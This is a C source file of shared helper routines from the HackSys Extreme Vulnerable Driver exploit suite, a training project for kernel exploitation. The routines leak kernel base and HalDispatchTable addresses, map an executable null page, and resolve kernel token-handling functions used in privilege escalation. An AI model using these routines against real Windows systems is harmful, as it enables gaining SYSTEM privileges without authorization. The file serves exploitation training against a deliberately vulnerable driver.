/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]payatu[dot]com
Website: http://www.payatu.com/

Copyright (C) 2011-2016 Payatu Technologies Pvt. Ltd. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    Common.c

Abstract:
    This module implements the methods which are 
    common to all the exploit modules.

--*/

#include "Common.h"

VOID ClearScreen() {
    //
    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms682022(v=vs.85).aspx
    //

    DWORD ConSize;
    HANDLE hConsole;
    DWORD CharsWritten;
    COORD CoordScreen = {0, 0};
    CONSOLE_SCREEN_BUFFER_INFO ConsoleScreenBufferInfo;

    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    if (!GetConsoleScreenBufferInfo(hConsole, &ConsoleScreenBufferInfo)) {
        return;
    }

    ConSize = ConsoleScreenBufferInfo.dwSize.X * ConsoleScreenBufferInfo.dwSize.Y;

    if (!FillConsoleOutputCharacter(hConsole,
                                    (TCHAR)' ',
                                    ConSize,
                                    CoordScreen,
                                    &CharsWritten )) {
        return;
    }

    if (!GetConsoleScreenBufferInfo(hConsole, &ConsoleScreenBufferInfo)) {
        return;
    }

    if (!FillConsoleOutputAttribute(hConsole,
                                    ConsoleScreenBufferInfo.wAttributes,
                                    ConSize,
                                    CoordScreen,
                                    &CharsWritten)) {
        return;
    }

    SetConsoleCursorPosition(hConsole, CoordScreen);
}


VOID ColoredConsoleOuput(WORD wColor, CONST PTCHAR fmt, ...) {
    SIZE_T Length = 0;
    PTCHAR DebugString;
    va_list args = NULL;
    HANDLE hConsoleOutput;
    WORD CurrentAttributes;
    CONSOLE_SCREEN_BUFFER_INFO ConsoleScreenBufferInfo;

    va_start(args, fmt);
    Length = _vscprintf(fmt, args) + 2;
    DebugString = (PTCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Length * sizeof(TCHAR));
    hConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);
    GetConsoleScreenBufferInfo(hConsoleOutput, &ConsoleScreenBufferInfo);
    CurrentAttributes = ConsoleScreenBufferInfo.wAttributes;
    SetConsoleTextAttribute(hConsoleOutput, FOREGROUND_INTENSITY | wColor);

    vfprintf(stderr, fmt, args);
    vsprintf_s(DebugString, Length, fmt, args);
    OutputDebugString(DebugString);

    SetConsoleTextAttribute(hConsoleOutput, CurrentAttributes);
    va_end(args);
    HeapFree(GetProcessHeap(), 0, (LPVOID)DebugString);
}

VOID CenterConsoleScreen() {
    HWND hConsoleWindow = GetConsoleWindow();
    int xPos = (GetSystemMetrics(SM_CXSCREEN) - 680) / 2;
    int yPos = ((GetSystemMetrics(SM_CYSCREEN) - 350) / 2) - 150;
    MoveWindow(hConsoleWindow, xPos, yPos, 700, 600, TRUE);
}

HANDLE GetDeviceHandle(LPCSTR FileName) {
    HANDLE hFile = NULL;

    hFile = CreateFile(FileName,
                       GENERIC_READ | GENERIC_WRITE,
                       FILE_SHARE_READ | FILE_SHARE_WRITE,
                       NULL,
                       OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
                       NULL);

    return hFile;
}

DWORD GetProcessID(LPCSTR ProcessName) {
    ULONG ProcessID = 0;
    HANDLE hProcessSnapshot = NULL;
    PROCESSENTRY32 ProcessEntry32 = {0};
    ProcessEntry32.dwSize = sizeof(PROCESSENTRY32);

    // Create the snapshot of all processes
    hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (!hProcessSnapshot) {
        DEBUG_ERROR("\t\t[-] Failed Creating Snapshot Of Processes: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    if (!Process32First(hProcessSnapshot, &ProcessEntry32)) {
        DEBUG_ERROR("\t\t[-] Failed To Get Info About First Process: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    do {
        if (strcmp(ProcessName, ProcessEntry32.szExeFile) == 0) {
            ProcessID = ProcessEntry32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnapshot, &ProcessEntry32));

    CloseHandle(hProcessSnapshot);

    return ProcessID;
}

PVOID GetHalDispatchTable() {
    PCHAR KernelImage;
    SIZE_T ReturnLength;
    HMODULE hNtDll = NULL;
    PVOID HalDispatchTable = NULL;
    HMODULE hKernelInUserMode = NULL;
    PVOID KernelBaseAddressInKernelMode;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    PSYSTEM_MODULE_INFORMATION pSystemModuleInformation;

    hNtDll = LoadLibrary("ntdll.dll");

    if (!hNtDll) {
        DEBUG_ERROR("\t\t\t[-] Failed To Load NtDll.dll: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtDll, "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtQuerySystemInformation: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    NtStatus = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &ReturnLength);

    // Allocate the Heap chunk
    pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(),
                                                                     HEAP_ZERO_MEMORY,
                                                                     ReturnLength);

    if (!pSystemModuleInformation) {
        DEBUG_ERROR("\t\t\t[-] Memory Allocation Failed For SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    NtStatus = NtQuerySystemInformation(SystemModuleInformation,
                                        pSystemModuleInformation,
                                        ReturnLength,
                                        &ReturnLength);

    if (NtStatus != STATUS_SUCCESS) {
        DEBUG_ERROR("\t\t\t[-] Failed To Get SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    KernelBaseAddressInKernelMode = pSystemModuleInformation->Module[0].Base;
    KernelImage = strrchr((PCHAR)(pSystemModuleInformation->Module[0].ImageName), '\\') + 1;

    DEBUG_INFO("\t\t\t[+] Loaded Kernel: %s\n", KernelImage);
    DEBUG_INFO("\t\t\t[+] Kernel Base Address: 0x%p\n", KernelBaseAddressInKernelMode);
    
    hKernelInUserMode = LoadLibraryA(KernelImage);

    if (!hKernelInUserMode) {
        DEBUG_ERROR("\t\t\t[-] Failed To Load Kernel: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    // This is still in user mode
    HalDispatchTable = (PVOID)GetProcAddress(hKernelInUserMode, "HalDispatchTable");

    if (!HalDispatchTable) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving HalDispatchTable: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        HalDispatchTable = (PVOID)((ULONG_PTR)HalDispatchTable - (ULONG_PTR)hKernelInUserMode);

        // Here we get the address of HapDispatchTable in Kernel mode
        HalDispatchTable = (PVOID)((ULONG_PTR)HalDispatchTable + (ULONG_PTR)KernelBaseAddressInKernelMode);

        DEBUG_INFO("\t\t\t[+] HalDispatchTable: 0x%p\n", HalDispatchTable);
    }

    HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation);

    if (hNtDll) {
        FreeLibrary(hNtDll);
    }

    if (hKernelInUserMode) {
        FreeLibrary(hKernelInUserMode);
    }

    hNtDll = NULL;
    hKernelInUserMode = NULL;
    pSystemModuleInformation = NULL;

    return HalDispatchTable;
}

BOOL MapNullPage() {
    HMODULE hNtdll;
    SIZE_T RegionSize = 0x1000;            // will be rounded up to the next host
                                           // page size address boundary -> 0x2000

    PVOID BaseAddress = (PVOID)0x00000001; // will be rounded down to the next host
                                           // page size address boundary -> 0x00000000
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;

    hNtdll = GetModuleHandle("ntdll.dll");

    // Grab the address of NtAllocateVirtualMemory
    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

    if (!NtAllocateVirtualMemory) {
        DEBUG_ERROR("\t\t[-] Failed Resolving NtAllocateVirtualMemory: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    // Allocate the Virtual memory
    NtStatus = NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF,
                                       &BaseAddress,
                                       0,
                                       &RegionSize,
                                       MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
                                       PAGE_EXECUTE_READWRITE);

    if (NtStatus != STATUS_SUCCESS) {
        DEBUG_ERROR("\t\t\t\t[-] Virtual Memory Allocation Failed: 0x%x\n", NtStatus);
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] Memory Allocated: 0x%p\n", BaseAddress);
        DEBUG_INFO("\t\t\t[+] Allocation Size: 0x%X\n", RegionSize);
    }

    FreeLibrary(hNtdll);

    return TRUE;
}

VOID ResolveKernelAPIs() {
    PCHAR KernelImage;
    SIZE_T ReturnLength;
    HMODULE hNtDll = NULL;
    PVOID HalDispatchTable = NULL;
    HMODULE hKernelInUserMode = NULL;
    PVOID KernelBaseAddressInKernelMode;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    PSYSTEM_MODULE_INFORMATION pSystemModuleInformation;

    DEBUG_INFO("\t\t[+] Resolving Kernel APIs\n");

    hNtDll = LoadLibrary("ntdll.dll");
    if (!hNtDll) {
        DEBUG_ERROR("\t\t\t[-] Failed To Load NtDll.dll: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtDll, "NtAllocateVirtualMemory");
    if (!NtAllocateVirtualMemory) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtAllocateVirtualMemory: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] NtAllocateVirtualMemory: 0x%p\n", NtAllocateVirtualMemory);
    }

    NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtDll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtQuerySystemInformation: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] NtQuerySystemInformation: 0x%p\n", NtQuerySystemInformation);
    }

    NtSetInformationProcess = (NtSetInformationProcess_t)GetProcAddress(hNtDll, "NtSetInformationProcess");
    if (!NtSetInformationProcess) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtSetInformationProcess: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] NtSetInformationProcess: 0x%p\n", NtSetInformationProcess);
    }

    NtCreateDirectoryObject = (NtCreateDirectoryObject_t)GetProcAddress(hNtDll, "NtCreateDirectoryObject");
    if (!NtCreateDirectoryObject) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtCreateDirectoryObject: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] NtCreateDirectoryObject: 0x%p\n", NtCreateDirectoryObject);
    }

    NtOpenDirectoryObject = (NtOpenDirectoryObject_t)GetProcAddress(hNtDll, "NtOpenDirectoryObject");
    if (!NtOpenDirectoryObject) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtOpenDirectoryObject: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] NtOpenDirectoryObject: 0x%p\n", NtOpenDirectoryObject);
    }

    NtCreateSymbolicLinkObject = (NtCreateSymbolicLinkObject_t)GetProcAddress(hNtDll, "NtCreateSymbolicLinkObject");
    if (!NtCreateSymbolicLinkObject) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtCreateSymbolicLinkObject: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] NtCreateSymbolicLinkObject: 0x%p\n", NtCreateSymbolicLinkObject);
    }

    RtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddress(hNtDll, "RtlInitUnicodeString");
    if (!RtlInitUnicodeString) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving RtlInitUnicodeString: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] RtlInitUnicodeString: 0x%p\n", RtlInitUnicodeString);
    }

    NtMapUserPhysicalPages = (NtMapUserPhysicalPages_t)GetProcAddress(hNtDll, "NtMapUserPhysicalPages");
    if (!NtMapUserPhysicalPages) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtMapUserPhysicalPages: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] NtMapUserPhysicalPages: 0x%p\n", NtMapUserPhysicalPages);
    }

    NtStatus = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &ReturnLength);

    // Allocate the Heap chunk
    pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(),
                                                                     HEAP_ZERO_MEMORY,
                                                                     ReturnLength);
    if (!pSystemModuleInformation) {
        DEBUG_ERROR("\t\t\t[-] Memory Allocation Failed For SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    NtStatus = NtQuerySystemInformation(SystemModuleInformation,
                                        pSystemModuleInformation,
                                        ReturnLength,
                                        &ReturnLength);
    if (NtStatus != STATUS_SUCCESS) {
        DEBUG_ERROR("\t\t\t[-] Failed To Get SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    KernelBaseAddressInKernelMode = pSystemModuleInformation->Module[0].Base;
    KernelImage = strrchr((PCHAR)(pSystemModuleInformation->Module[0].ImageName), '\\') + 1;

    hKernelInUserMode = LoadLibraryA(KernelImage);
    if (!hKernelInUserMode) {
        DEBUG_ERROR("\t\t\t[-] Failed To Load Kernel: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    ZwOpenProcess = (ZwOpenProcess_t)GetProcAddress(hKernelInUserMode, "ZwOpenProcess");
    if (!ZwOpenProcess) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving ZwOpenProcess: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        ZwOpenProcess = (ZwOpenProcess_t)((ULONG)ZwOpenProcess - (ULONG)hKernelInUserMode);
        ZwOpenProcess = (ZwOpenProcess_t)((ULONG)ZwOpenProcess + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] ZwOpenProcess: 0x%p\n", ZwOpenProcess);
    }

    ZwOpenProcessToken = (ZwOpenProcessToken_t)GetProcAddress(hKernelInUserMode, "ZwOpenProcessToken");
    if (!ZwOpenProcessToken) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving ZwOpenProcessToken: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        ZwOpenProcessToken = (ZwOpenProcessToken_t)((ULONG)ZwOpenProcessToken - (ULONG)hKernelInUserMode);
        ZwOpenProcessToken = (ZwOpenProcessToken_t)((ULONG)ZwOpenProcessToken + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] ZwOpenProcessToken: 0x%p\n", ZwOpenProcess);
    }

    ZwDuplicateToken = (ZwDuplicateToken_t)GetProcAddress(hKernelInUserMode, "ZwDuplicateToken");
    if (!ZwDuplicateToken) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving ZwDuplicateToken: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        ZwDuplicateToken = (ZwDuplicateToken_t)((ULONG)ZwDuplicateToken - (ULONG)hKernelInUserMode);
        ZwDuplicateToken = (ZwDuplicateToken_t)((ULONG)ZwDuplicateToken + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] ZwDuplicateToken: 0x%p\n", ZwDuplicateToken);
    }

    PsGetCurrentProcess = (PsGetCurrentProcess_t)GetProcAddress(hKernelInUserMode, "PsGetCurrentProcess");
    if (!PsGetCurrentProcess) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving PsGetCurrentProcess: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        PsGetCurrentProcess = (PsGetCurrentProcess_t)((ULONG)PsGetCurrentProcess - (ULONG)hKernelInUserMode);
        PsGetCurrentProcess = (PsGetCurrentProcess_t)((ULONG)PsGetCurrentProcess + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] PsGetCurrentProcess: 0x%p\n", PsGetCurrentProcess);
    }

    PsLookupProcessByProcessId = (PsLookupProcessByProcessId_t)GetProcAddress(hKernelInUserMode, "PsLookupProcessByProcessId");
    if (!PsLookupProcessByProcessId) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving PsLookupProcessByProcessId: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        PsLookupProcessByProcessId = (PsLookupProcessByProcessId_t)((ULONG)PsLookupProcessByProcessId - (ULONG)hKernelInUserMode);
        PsLookupProcessByProcessId = (PsLookupProcessByProcessId_t)((ULONG)PsLookupProcessByProcessId + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] PsLookupProcessByProcessId: 0x%p\n", PsLookupProcessByProcessId);
    }

    PsReferencePrimaryToken = (PsReferencePrimaryToken_t)GetProcAddress(hKernelInUserMode, "PsReferencePrimaryToken");
    if (!PsReferencePrimaryToken) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving PsReferencePrimaryToken: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        PsReferencePrimaryToken = (PsReferencePrimaryToken_t)((ULONG)PsReferencePrimaryToken - (ULONG)hKernelInUserMode);
        PsReferencePrimaryToken = (PsReferencePrimaryToken_t)((ULONG)PsReferencePrimaryToken + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] PsReferencePrimaryToken: 0x%p\n", PsReferencePrimaryToken);
    }

    ZwSetInformationProcess = (ZwSetInformationProcess_t)GetProcAddress(hKernelInUserMode, "ZwSetInformationProcess");
    if (!ZwSetInformationProcess) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving ZwSetInformationProcess: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        ZwSetInformationProcess = (ZwSetInformationProcess_t)((ULONG)ZwSetInformationProcess - (ULONG)hKernelInUserMode);
        ZwSetInformationProcess = (ZwSetInformationProcess_t)((ULONG)ZwSetInformationProcess + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] ZwSetInformationProcess: 0x%p\n", ZwSetInformationProcess);
    }

    ZwClose = (ZwClose_t)GetProcAddress(hKernelInUserMode, "ZwClose");
    if (!ZwClose) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving ZwClose: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        ZwClose = (ZwClose_t)((ULONG)ZwClose - (ULONG)hKernelInUserMode);
        ZwClose = (ZwClose_t)((ULONG)ZwClose + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] ZwClose: 0x%p\n", ZwClose);
    }

    HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation);

    if (hNtDll) {
        FreeLibrary(hNtDll);
    }

    if (hKernelInUserMode) {
        FreeLibrary(hKernelInUserMode);
    }

    hNtDll = NULL;
    hKernelInUserMode = NULL;
    pSystemModuleInformation = NULL;
}

ULONG GetNumberOfProcessors() {
    SYSTEM_INFO SystemInfo;

    GetSystemInfo(&SystemInfo);

    return (ULONG)SystemInfo.dwNumberOfProcessors;
}
